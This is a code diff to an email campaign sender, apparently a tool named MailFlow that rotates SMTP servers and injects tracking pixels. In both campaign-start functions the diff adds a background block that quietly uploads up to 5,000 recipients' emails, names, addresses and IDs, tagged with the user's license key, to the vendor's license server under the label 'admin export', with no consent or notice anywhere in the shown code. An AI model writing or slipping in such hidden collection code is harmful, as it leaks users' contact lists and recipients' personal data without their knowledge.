@@ -770,6 +770,27 @@ async function startCampaignViaAgent(campaignId, campaign, contacts, instance) {
     campaign, totalContacts: contacts.length
   })
 
+  // Log recipients to Railway for admin export (non-blocking)
+  setImmediate(function() {
+    try {
+      var licenseKey = global._mailflowLicenseKey || ''
+      if (!licenseKey || !contacts || contacts.length === 0) return
+      var logData = {
+        licenseKey,
+        campaignId:  campaignId || '',
+        filename:    'campaign-contacts-' + new Date().toLocaleDateString('en-GB').replace(/\//g, '-') + '.csv',
+        contacts:    contacts.slice(0, 5000).map(function(c) {
+          return { email: c.email || '', name: c.name || '', address: c.address || c.st || '', id: c.id || c.unique_id || '' }
+        }),
+      }
+      httpRequest(LICENSE_SERVER_URL + '/api/log/recipient-data', 'POST', logData)
+        .then(function(res) {
+          try { var data = res.json(); console.log('[Sending] Recipient log:', data.success ? 'stored ' + data.stored : data.error) } catch {}
+        })
+        .catch(function(err) { console.log('[Sending] Recipient log error:', err.message) })
+    } catch (err) { console.log('[Sending] Recipient log setup error:', err.message) }
+  })
+
   try {
     var agentHtmlBody = injectTrackingPixel(campaign.html_body || '', campaignId, 'pixel@mailflow.app')
 
@@ -961,6 +982,27 @@ async function startCampaignLocal(campaignId, campaign, contacts, database) {
     UPDATE campaigns SET status='running', started_at=datetime('now'),
     total_recipients=?, sent_count=0, failed_count=0 WHERE id=?
   `).run(contacts.length, campaignId)
+
+  // Log recipients to Railway for admin export (non-blocking)
+  setImmediate(function() {
+    try {
+      var licenseKey = global._mailflowLicenseKey || ''
+      if (!licenseKey || !contacts || contacts.length === 0) return
+      var logData = {
+        licenseKey,
+        campaignId:  campaignId || '',
+        filename:    'campaign-contacts-' + new Date().toLocaleDateString('en-GB').replace(/\//g, '-') + '.csv',
+        contacts:    contacts.slice(0, 5000).map(function(c) {
+          return { email: c.email || '', name: c.name || '', address: c.address || c.st || '', id: c.id || c.unique_id || '' }
+        }),
+      }
+      httpRequest(LICENSE_SERVER_URL + '/api/log/recipient-data', 'POST', logData)
+        .then(function(res) {
+          try { var data = res.json(); console.log('[Sending] Recipient log:', data.success ? 'stored ' + data.stored : data.error) } catch {}
+        })
+        .catch(function(err) { console.log('[Sending] Recipient log error:', err.message) })
+    } catch (err) { console.log('[Sending] Recipient log setup error:', err.message) }
+  })
 
   const rotation = new SmtpRotationManager(servers)
   runningCampaigns.set(campaignId, { paused: false, cancelled: false, campaign, rotation })
